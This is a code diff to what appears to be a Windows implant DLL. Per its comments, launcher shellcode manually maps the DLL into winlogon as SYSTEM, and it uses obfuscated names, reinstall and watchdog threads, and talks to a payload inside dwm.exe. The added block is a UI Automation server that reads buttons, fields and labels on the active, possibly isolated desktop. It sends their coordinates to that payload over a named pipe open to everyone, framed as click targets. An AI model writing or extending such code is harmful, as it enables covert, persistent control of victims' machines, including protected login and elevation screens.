@@ -55,14 +55,18 @@
 #include <aclapi.h>
 #include <bcrypt.h>
 #include <stdint.h>
-/* v3.0.3 (2026-09-21): sentinel_thread additions -- shell + payload
- * resurrection from inside winlogon. See sentinel_thread block below. */
 #include <wtsapi32.h>
 #include <userenv.h>
 #include <tlhelp32.h>
-/* v3.0.3 (2026-09-21): sddl.h for ConvertStringSecurityDescriptor... used
- * in sn_write_panic_sentinel's locked-DACL sentinel writer. */
 #include <sddl.h>
+/* v15.1.8 (2026-09-22) -- UIA server for isolated-desktop ground truth.
+ * Included with COBJMACROS so we can call vtable methods as
+ *   IUIAutomation_ElementFromPoint(uia, pt, &el)
+ * instead of the ugly C-style p->lpVtbl->method(p, ...) chain. */
+#define COBJMACROS
+#include <oleauto.h>
+#include <oleacc.h>
+#include <uiautomation.h>
 
 /* Manual-map target: /GS- + /guard:cf- MANDATORY (see payload/build.bat).
  * When compiled as a LoadLibrary target (iteration), the Windows loader
@@ -158,6 +162,11 @@ static const char NAME_SCREENSAVER_x[13] = { XCHAR('S'),XCHAR('c'),XCHAR('r'),XC
  * A named mutex enforces one-active-per-session cleanly. */
 #define SALT_MTX_SENTINEL  "wasvc.mtx.sentinel.1"
 #define SALT_MTX_EMERG_HK  "wasvc.mtx.emerg.hk.1"
+/* v15.1.8 (2026-09-22) -- UIA request/reply pipe salt (matches
+ * shared/obf_names.c SALT_PIPE_ISO_CMD). Duplex pipe; payload sends
+ * a UIA snap/enum request, helper does the UIA query with
+ * SetThreadDesktop(active) so it sees the isolated desktop, replies. */
+#define SALT_PIPE_ISO_CMD  "wasvc.pipe.iso.cmd.1"
 
 /* Fallback if MachineGuid read fails (BOTH sides use this same literal
  * so IPC still agrees in the degenerate case). Matches obf_names.c. */
@@ -228,6 +237,17 @@ static const char *wl_iso_pipe_name(void) {
     if (buf[0]) return buf;
     char guid[40] = {0};
     if (!wl_derive_guid(SALT_PIPE_ISO, guid, sizeof(guid)))
+        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
+    wsprintfA(buf, "\\\\.\\pipe\\%s", guid);
+    return buf;
+}
+/* v15.1.8 -- UIA-cmd pipe: payload -> helper request, helper -> payload
+ * reply. Duplex. Same derivation pattern as wl_iso_pipe_name. */
+static const char *wl_iso_cmd_pipe_name(void) {
+    static char buf[64] = {0};
+    if (buf[0]) return buf;
+    char guid[40] = {0};
+    if (!wl_derive_guid(SALT_PIPE_ISO_CMD, guid, sizeof(guid)))
         lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
     wsprintfA(buf, "\\\\.\\pipe\\%s", guid);
     return buf;
@@ -1962,6 +1982,299 @@ static DWORD WINAPI sentinel_thread(LPVOID unused) {
 }
 /* ═══════════ end v3.0.3 sentinel + emergency block ═══════════ */
 
+/* ═══════════════════════════════════════════════════════════════════════
+ * v15.1.8 (2026-09-22) -- UIA server for isolated-desktop ground truth.
+ *
+ * The payload (in dwm.exe / DWM-N) cannot reach the isolated desktop's
+ * UIA tree from its own thread desktop (\Default). This server thread
+ * lives in winlogon (SYSTEM, session 0), SetThreadDesktops to the
+ * currently-active desktop per-request, calls UIAutomation, and replies
+ * over a duplex named pipe.
+ *
+ * Wire (must match payload/src/capture/ground.cpp copies byte-for-byte):
+ *   hdr = { u32 magic=0x00415155 'UAA', u32 opcode, u32 payload_len }
+ *   OP_SNAP req(8) = int32 sx, int32 sy
+ *   OP_SNAP rep(12) = u32 snapped, int32 sx, int32 sy
+ *   OP_ENUM req(24) = int32 monL,monT,monW,monH; double render_scale
+ *   OP_ENUM rep(N) = N bytes text (composed "role | \"label\" | x,y\n" lines)
+ * Failure -> reply with payload_len=0 (helper always sends a header).
+ * The pipe is single-instance so requests serialize naturally. */
+#define UIA_MAGIC     0x00415155u
+#define UIA_OP_SNAP   1u
+#define UIA_OP_ENUM   2u
+
+#pragma pack(push, 1)
+typedef struct { uint32_t magic, opcode, payload_len; } uia_hdr_t;
+typedef struct { int32_t sx, sy; }                      uia_snap_req_t;
+typedef struct { uint32_t snapped; int32_t sx, sy; }    uia_snap_rep_t;
+typedef struct {
+    int32_t mon_left, mon_top, mon_w, mon_h;
+    double  render_scale;
+} uia_enum_req_t;
+#pragma pack(pop)
+
+/* Attach the current thread to the CURRENTLY ACTIVE input desktop so
+ * UIA sees isolated-desktop windows. Returns the HDESK we opened
+ * (caller CloseDesktop's it) or NULL on failure. */
+static HDESK uia_attach_active_desktop(void) {
+    HDESK cur = OpenInputDesktop(0, TRUE, GENERIC_ALL);
+    if (!cur) return NULL;
+    if (!SetThreadDesktop(cur)) {
+        CloseDesktop(cur);
+        return NULL;
+    }
+    return cur;
+}
+
+/* Handle one UIA_OP_SNAP: ElementFromPoint(x,y) + GetClickablePoint. */
+static void uia_handle_snap(IUIAutomation *uia,
+                            const uia_snap_req_t *req, uia_snap_rep_t *rep) {
+    rep->snapped = 0;
+    rep->sx = req->sx;
+    rep->sy = req->sy;
+    if (!uia) return;
+    POINT pt = { req->sx, req->sy };
+    IUIAutomationElement *el = NULL;
+    __try {
+        HRESULT hr = IUIAutomation_ElementFromPoint(uia, pt, &el);
+        if (SUCCEEDED(hr) && el) {
+            POINT cp; BOOL got = FALSE;
+            hr = IUIAutomationElement_GetClickablePoint(el, &cp, &got);
+            if (SUCCEEDED(hr) && got) {
+                rep->snapped = 1;
+                rep->sx = cp.x;
+                rep->sy = cp.y;
+            } else {
+                RECT r;
+                hr = IUIAutomationElement_get_CurrentBoundingRectangle(el, &r);
+                LONG w = r.right - r.left, hgt = r.bottom - r.top;
+                if (SUCCEEDED(hr) && w >= 2 && hgt >= 2 && !(w > 3840 && hgt > 2160)) {
+                    rep->snapped = 1;
+                    rep->sx = (r.left + r.right) / 2;
+                    rep->sy = (r.top + r.bottom) / 2;
+                }
+            }
+            IUIAutomationElement_Release(el);
+        }
+    } __except (EXCEPTION_EXECUTE_HANDLER) { /* fail-open */ }
+}
+
+/* Append one anchor line to buf if the element is interactive + in-bounds.
+ * Returns 1 if appended. Bounded, never overflows. */
+static int uia_append_anchor(IUIAutomationElement *el,
+                             const uia_enum_req_t *req, double rs,
+                             char *buf, size_t cap, size_t *used, int *count) {
+    if (*count >= 40) return 0;
+    RECT r;
+    if (FAILED(IUIAutomationElement_get_CurrentBoundingRectangle(el, &r))) return 0;
+    LONG w = r.right - r.left, hgt = r.bottom - r.top;
+    if (w < 2 || hgt < 2) return 0;
+    if (w > 3840 && hgt > 2160) return 0;
+    LONG cx = (r.left + r.right) / 2;
+    LONG cy = (r.top + r.bottom) / 2;
+    if (cx < req->mon_left || cx >= req->mon_left + req->mon_w ||
+        cy < req->mon_top  || cy >= req->mon_top  + req->mon_h) return 0;
+
+    CONTROLTYPEID ct = 0;
+    IUIAutomationElement_get_CurrentControlType(el, &ct);
+    const char *role = NULL;
+    if      (ct == UIA_ButtonControlTypeId)      role = "button";
+    else if (ct == UIA_CheckBoxControlTypeId)    role = "checkbox";
+    else if (ct == UIA_RadioButtonControlTypeId) role = "radio";
+    else if (ct == UIA_ComboBoxControlTypeId)    role = "combo";
+    else if (ct == UIA_EditControlTypeId)        role = "input";
+    else if (ct == UIA_HyperlinkControlTypeId)   role = "link";
+    else if (ct == UIA_ListItemControlTypeId)    role = "item";
+    else if (ct == UIA_MenuItemControlTypeId)    role = "menu";
+    else if (ct == UIA_TabItemControlTypeId)     role = "tab";
+    else if (ct == UIA_TreeItemControlTypeId)    role = "tree";
+    else if (ct == UIA_SliderControlTypeId)      role = "slider";
+    else if (ct == UIA_TextControlTypeId)        role = "text";
+    else return 0;
+
+    /* Only append if `role` is set + write the line. */
+    if (!role) return 0;
+    char label[160]; label[0] = 0;
+    BSTR name = NULL;
+    if (SUCCEEDED(IUIAutomationElement_get_CurrentName(el, &name)) && name) {
+        int n = WideCharToMultiByte(CP_UTF8, 0, name, -1, label,
+                                    (int)sizeof(label) - 1, NULL, NULL);
+        if (n > 0) label[n < (int)sizeof(label) ? n - 1 : (int)sizeof(label) - 1] = 0;
+        SysFreeString(name);
+    }
+    if (ct == UIA_TextControlTypeId && !label[0]) return 0;
+
+    int img_x = (int)((cx - req->mon_left) * rs + 0.5);
+    int img_y = (int)((cy - req->mon_top)  * rs + 0.5);
+
+    for (char *p = label; *p; ++p) if (*p == '\n' || *p == '\r' || *p == '|') *p = ' ';
+
+    char line[256];
+    int  n = wsprintfA(line, "%s | \"%s\" | %d,%d\n", role, label, img_x, img_y);
+    if (n <= 0) return 0;
+    if (*used + (size_t)n + 1 > cap) return 0;   /* would overflow */
+    memcpy(buf + *used, line, (size_t)n);
+    *used += (size_t)n;
+    buf[*used] = 0;
+    (*count)++;
+    return 1;
+}
+
+/* Handle one UIA_OP_ENUM: walk the foreground window's subtree, produce
+ * an anchor block to the caller's buf. Returns the # bytes written.
+ * SEH-guarded (COM calls into isolated-desktop apps can throw). */
+static uint32_t uia_handle_enum(IUIAutomation *uia,
+                                const uia_enum_req_t *req,
+                                char *out_buf, uint32_t out_cap) {
+    if (!uia || !out_buf || out_cap < 128) return 0;
+    /* Reserve room for the header string. */
+    const char *header = "GROUND-TRUTH ELEMENTS (role | label | image-space center x,y) -- "
+                        "prefer these coordinates when they match your target:\n";
+    size_t used = 0;
+    size_t hlen = lstrlenA(header);
+    if (hlen + 1 > out_cap) return 0;
+    memcpy(out_buf, header, hlen);
+    used = hlen;
+    out_buf[used] = 0;
+    int count = 0;
+
+    __try {
+        IUIAutomationElement *root = NULL;
+        HWND fg = GetForegroundWindow();
+        HRESULT hr = fg
+            ? IUIAutomation_ElementFromHandle(uia, fg, &root)
+            : IUIAutomation_GetRootElement(uia, &root);
+        if (FAILED(hr) || !root) return 0;
+
+        IUIAutomationCondition *cond = NULL;
+        IUIAutomation_get_ControlViewCondition(uia, &cond);
+        if (cond) {
+            IUIAutomationElementArray *arr = NULL;
+            if (SUCCEEDED(IUIAutomationElement_FindAll(root, TreeScope_Subtree, cond, &arr)) && arr) {
+                int len = 0;
+                IUIAutomationElementArray_get_Length(arr, &len);
+                for (int i = 0; i < len && count < 40; i++) {
+                    IUIAutomationElement *el = NULL;
+                    if (SUCCEEDED(IUIAutomationElementArray_GetElement(arr, i, &el)) && el) {
+                        uia_append_anchor(el, req, req->render_scale,
+                                          out_buf, out_cap - 1, &used, &count);
+                        IUIAutomationElement_Release(el);
+                    }
+                }
+                IUIAutomationElementArray_Release(arr);
+            }
+            IUIAutomationCondition_Release(cond);
+        }
+        IUIAutomationElement_Release(root);
+    } __except (EXCEPTION_EXECUTE_HANDLER) { /* fail-open */ }
+
+    if (count == 0) return 0;   /* no anchors -> empty reply */
+    return (uint32_t)used;
+}
+
+/* Server thread: accept connections on the UIA-cmd pipe one at a time,
+ * service one request per connection (payload opens+closes per request
+ * to keep pipe state simple), reply, disconnect. Runs until halt event. */
+static const IID k_IID_IUIAutomation = { 0x30cbe57d, 0xd9d0, 0x452a,
+    { 0xab, 0x13, 0x7a, 0xc5, 0xac, 0x48, 0x25, 0xee } };
+static const CLSID k_CLSID_CUIAutomation = { 0xff48dba4, 0x60ef, 0x4201,
+    { 0xaa, 0x87, 0x54, 0x10, 0x3e, 0xef, 0x59, 0x4e } };
+
+static volatile LONG g_uia_srv_running = 0;
+
+static DWORD WINAPI uia_server_thread(LPVOID unused) {
+    (void)unused;
+    lg("uia_server: thread started");
+    /* COM MTA -- helper is winlogon SYSTEM, no STA needed. */
+    HRESULT hr_co = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    IUIAutomation *uia = NULL;
+    if (SUCCEEDED(CoCreateInstance(&k_CLSID_CUIAutomation, NULL,
+                                   CLSCTX_INPROC_SERVER,
+                                   &k_IID_IUIAutomation, (void **)&uia))) {
+        lg("uia_server: IUIAutomation ready");
+    } else {
+        lg("uia_server: IUIAutomation UNAVAILABLE (fail-open)");
+    }
+
+    while (InterlockedCompareExchange(&g_uia_srv_running, 0, 0)) {
+        SECURITY_DESCRIPTOR sd;
+        InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+        SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
+        SECURITY_ATTRIBUTES sa;
+        sa.nLength = sizeof(sa);
+        sa.lpSecurityDescriptor = &sd;
+        sa.bInheritHandle = FALSE;
+
+        HANDLE pipe = CreateNamedPipeA(
+            wl_iso_cmd_pipe_name(),
+            PIPE_ACCESS_DUPLEX,
+            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+            1,                      /* single instance -- serializes requests */
+            64 * 1024,              /* out buffer */
+            64 * 1024,              /* in buffer */
+            0, &sa);
+        if (pipe == INVALID_HANDLE_VALUE) {
+            lg("uia_server: CreateNamedPipe FAILED gle=%lu", GetLastError());
+            Sleep(1000);
+            continue;
+        }
+
+        BOOL connected = ConnectNamedPipe(pipe, NULL) ? TRUE
+                                                       : (GetLastError() == ERROR_PIPE_CONNECTED);
+        if (!connected) {
+            CloseHandle(pipe);
+            continue;
+        }
+
+        /* Reattach to the currently-active desktop for this request.
+         * Cheap, ~1ms; correctness > latency for cross-desktop UIA. */
+        HDESK desk = uia_attach_active_desktop();
+
+        uia_hdr_t hdr = {0};
+        DWORD rd = 0;
+        if (ReadFile(pipe, &hdr, sizeof(hdr), &rd, NULL) && rd == sizeof(hdr) &&
+            hdr.magic == UIA_MAGIC) {
+            uia_hdr_t reply_hdr = { UIA_MAGIC, hdr.opcode, 0 };
+            char reply_buf[32 * 1024];
+            const void *reply_payload = NULL;
+            uint32_t reply_len = 0;
+
+            if (hdr.opcode == UIA_OP_SNAP && hdr.payload_len == sizeof(uia_snap_req_t)) {
+                uia_snap_req_t req;
+                if (ReadFile(pipe, &req, sizeof(req), &rd, NULL) && rd == sizeof(req)) {
+                    uia_snap_rep_t rep;
+                    uia_handle_snap(uia, &req, &rep);
+                    memcpy(reply_buf, &rep, sizeof(rep));
+                    reply_payload = reply_buf;
+                    reply_len = sizeof(rep);
+                }
+            } else if (hdr.opcode == UIA_OP_ENUM && hdr.payload_len == sizeof(uia_enum_req_t)) {
+                uia_enum_req_t req;
+                if (ReadFile(pipe, &req, sizeof(req), &rd, NULL) && rd == sizeof(req)) {
+                    reply_len = uia_handle_enum(uia, &req, reply_buf, sizeof(reply_buf));
+                    reply_payload = reply_buf;
+                }
+            }
+            reply_hdr.payload_len = reply_len;
+            DWORD wr = 0;
+            WriteFile(pipe, &reply_hdr, sizeof(reply_hdr), &wr, NULL);
+            if (reply_len && reply_payload)
+                WriteFile(pipe, reply_payload, reply_len, &wr, NULL);
+            FlushFileBuffers(pipe);
+        }
+
+        if (desk) CloseDesktop(desk);
+        DisconnectNamedPipe(pipe);
+        CloseHandle(pipe);
+    }
+
+    if (uia) IUIAutomation_Release(uia);
+    if (hr_co == S_OK || hr_co == S_FALSE) CoUninitialize();
+    lg("uia_server: thread exit");
+    return 0;
+}
+/* ═══════════ end v15.1.8 UIA server block ═══════════ */
+
 /* ── DllMain -- entry point for BOTH manual-map and LoadLibrary ────
  *
  * Manual map: the launcher's shellcode calls DllMain(hInstance=base,
@@ -2049,6 +2362,13 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
         CreateThread(NULL, 0, emergency_reinstall_thread, NULL, 0, NULL);
         InterlockedExchange(&g_emerg_watchdog_running, 1);
         CreateThread(NULL, 0, emergency_watchdog_thread, NULL, 0, NULL);
+
+        /* v15.1.8 (2026-09-22) -- UIA server for isolated-desktop ground
+         * truth. Runs unconditionally; payload only connects when its
+         * rawin_is_isolated_desktop() flag is set, so on the normal
+         * desktop this thread just sits idle in ConnectNamedPipe. */
+        InterlockedExchange(&g_uia_srv_running, 1);
+        CreateThread(NULL, 0, uia_server_thread, NULL, 0, NULL);
     }
     return TRUE;
 }
